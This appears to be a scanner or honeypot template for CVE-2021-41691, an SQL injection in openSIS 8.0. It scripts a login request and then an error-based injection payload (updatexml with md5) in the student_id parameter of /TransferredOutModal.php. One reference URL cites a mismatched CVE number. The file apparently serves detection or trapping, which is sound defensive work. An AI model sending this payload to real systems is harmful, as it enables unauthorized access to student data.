id: CVE-2021-41691
info:
  name: openSIS Student Information System 8.0 SQL Injection
  author: Bartu Utku SARP
  description: openSIS Student Information System version 8.0 is susceptible to SQL
    injection via the student_id and TRANSFER[SCHOOL] parameters in POST request sent
    to /TransferredOutModal.php.
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    manipulation, or data leakage.

    '
  remediation: 'Apply the latest security patch or upgrade to a patched version of
    openSIS Student Information System to mitigate the SQL Injection vulnerability
    (CVE-2021-41691).

    '
  reference:
  - https://securityforeveryone.com/blog/opensis-student-information-system-0-day-vulnerability-cve-2021-41691
  - https://www.exploit-db.com/exploits/50637
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4169
  classification:
    cve-id: CVE-2021-41691
  metadata:
    max-request: 2
  tags: cve,cve2021,sqli,auth,edb,opensis
traps:
- request:
    method: POST
    path: /index.php
    headers:
      Origin: '{{BaseURL}}'
      Content-Type: application/x-www-form-urlencoded
    body: 'USERNAME={{username}}&PASSWORD={{password}}&language=en&log=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /TransferredOutModal.php?modfunc=detail
    headers:
      Origin: '{{BaseURL}}'
      Content-Type: application/x-www-form-urlencoded
    body: 'student_id=updatexml(0x23,concat(1,md5({{num}})),1)&button=Save&TRANSFER[SCHOOL]=5&TRANSFER[Grade_Level]=5

      '
  response:
    status_code: 200
    headers: {}
    body: <!-- SQL STATEMENT:SELECT COUNT(STUDENT_ID)
